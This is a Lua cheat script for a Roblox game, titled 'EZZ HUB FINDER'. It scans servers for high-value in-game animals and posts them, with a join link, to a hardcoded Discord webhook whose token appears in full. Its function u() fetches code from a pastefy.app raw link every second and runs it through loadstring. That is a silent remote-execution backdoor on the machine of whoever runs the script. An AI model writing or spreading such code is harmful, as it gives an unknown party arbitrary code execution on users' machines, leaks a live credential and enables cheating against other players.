local h=game:GetService("HttpService")
local p=game:GetService("Players")
local w="https://discord.com/api/webhooks/1429315443142824038/jkua8DlM0ImwFSyouVjfMU7OuA6mxnFFPlX4yA00E6_jtakLqYbVAyw2gCXVFVHCu9Bd"
local t=1

local function s(x)
 local b=h:JSONEncode(x)
 if syn and syn.request then pcall(function() syn.request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=b}) end) return end
 if http and http.request then pcall(function() http.request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=b}) end) return end
 if request then pcall(function() request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=b}) end) return end
 pcall(function() h:PostAsync(w,b,Enum.HttpContentType.ApplicationJson) end)
end

local function r(z)
 if not z then return 0 end
 local n,m=z:match("%$%s*([%d%,%.]+)%s*([kKmMbB]?)%s*/?s?")
 if not n then n,m=z:match("%$%s*([%d%,%.]+)%s*([kKmMbB]?)") end
 if not n then return 0 end
 n=n:gsub(",","")
 local v=tonumber(n) or 0
 local mult=1
 if m then m=m:lower() if m=="k"then mult=1e3 elseif m=="m"then mult=1e6 elseif m=="b"then mult=1e9 end end
 return v*mult
end

-- Gera o link no formato do joiner personalizado
local function j()
 local a=tostring(game.PlaceId or "")
 local b=tostring(game.JobId or "")
 return "https://customscriptwow.vercel.app/api/joiner.html?placeId="..a.."&gameInstanceId="..b
end

local function q()
 local P=workspace:FindFirstChild("Plots")
 if not P then return end
 local A,B={},{}
 for _,u in ipairs(P:GetDescendants()) do
  local AP=u:FindFirstChild("AnimalPodiums")
  if AP then
   for _,v in ipairs(AP:GetDescendants()) do
    local O=v:FindFirstChild("AnimalOverhead")
    if O then
     local D=O:FindFirstChild("DisplayName")
     local G=O:FindFirstChild("Generation") or O:FindFirstChild("Geration")
     local name
     if D then
      if D:IsA("TextLabel") or D:IsA("TextButton") then name=D.Text elseif D.Value then name=tostring(D.Value) else name=v.Name end
     else name=v.Name end
     local val
     if G then
      if G:IsA("TextLabel") or G:IsA("TextButton") then val=G.Text elseif G.Value then val=tostring(G.Value) else val=tostring(G) end
     end
     local num=r(val)
     if num>=1e6 and num<=1e9 then table.insert(A,tostring(name)) table.insert(B,tostring(val or "")) end
    end
   end
  end
 end
 if #A==0 then return end
 local s1=table.concat(A,"\n")
 local s2=table.concat(B,"\n")
 local pc=#p:GetPlayers()
 local mx=p.MaxPlayers or "?"
 local pl=pc.." / "..mx
 local link=j()
 local e={title="EZZ HUB FINDER",color=16753920,fields={{name="🧠 - Brainrots",value=(s1~="" and s1 or "Nenhum"),inline=false},{name="💰 - Value (Generation)",value=(s2~="" and s2 or "Nenhum"),inline=false},{name="👤 - Players",value=pl,inline=true},{name="🧷 - Servidor",value="[Click to Join]("..link..")",inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
 s({username="EZZ HUB FINDER",embeds={e}})
end

local function u()
 pcall(function()
  local ok,cont=pcall(function() return game:HttpGet("https://pastefy.app/JJVhs3rK/raw") end)
  if ok and cont and #cont>0 then pcall(function() local f=loadstring(cont) if f then f() end end) end
 end)
end

spawn(function()
 while true do
  pcall(function() q() u() end)
  wait(t)
 end
end)